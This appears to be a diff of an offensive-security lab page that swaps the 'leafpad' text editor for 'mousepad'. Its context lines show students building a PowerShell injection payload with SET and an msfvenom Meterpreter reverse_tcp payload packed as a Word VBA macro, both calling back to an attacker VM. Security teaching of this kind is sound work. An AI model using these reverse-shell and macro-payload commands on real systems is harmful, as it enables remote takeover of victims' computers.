@@ -276,9 +276,9 @@ execute it on Windows which opens a Meterpreter session on attacker’s machine.
 4.   Enter your Kali VM IP address `192.168.56.101` and accept the default of port `443`. Choose `yes` to start the listener.
      This will automatically open `msfconsole` and run some commands for you to set up a listener like you did manually in Part 1.
 5.   Open another terminal and navigate to `/root/.set/reports/powershell/`
-6.   From that directory, open the script using the `leafpad` command:
+6.   From that directory, open the script using the `mousepad` command:
 
-          leafpad x86_powershell_injection.txt
+          mousepad x86_powershell_injection.txt
 
      Examine the script. It is `powershell -W 1 -C "a-command-to-run"`.
 
@@ -289,7 +289,7 @@ execute it on Windows which opens a Meterpreter session on attacker’s machine.
        In this case, the command includes a base64-encoded script that will
        attempt to open a meterpreter connection back to `192.168.56.101:443`.
 
-7.   Copy the entire script you found on `leafpad` to the clipboard.
+7.   Copy the entire script you found on `mousepad` to the clipboard.
      {% include lab-image.html image='powershell-save-payload.png' %}
 8.   On Windows, open a powershell session:
      * Either search for `powershell` and run "Windows Powershell",
@@ -364,7 +364,7 @@ portion of this lab.
           msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=infosec-net LPORT=7777 -e x86/shikata_ga_nai -f vba-exe > word-macro-exploit
 
      This will save the exploit to a file called `word-macro-exploit`
-2.   Open `word-macro-exploit` using `leafpad`, and read the beginning of the output. It explains that the output is
+2.   Open `word-macro-exploit` using `mousepad`, and read the beginning of the output. It explains that the output is
      divided into two sections: A "Macro" section and a "Payload" section.
 
      We will need to put the "Macro" section into a VBA module attached to a Word document,
